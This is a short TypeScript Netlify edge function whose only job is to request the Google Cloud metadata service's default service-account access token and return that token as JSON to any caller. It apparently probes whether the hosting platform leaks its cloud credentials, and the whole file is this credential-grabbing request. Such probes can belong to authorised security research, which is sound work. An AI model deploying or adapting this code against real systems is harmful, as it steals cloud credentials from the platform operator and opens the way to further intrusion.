import { Context } from "netlify:edge";

export default async (request: Request, context: Context) => {

  const joke = await fetch("http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token", {
    "headers": {
      "Accept": "application/json"
    }
  });
  const jsonData = await joke.json();
  return context.json(jsonData);
};
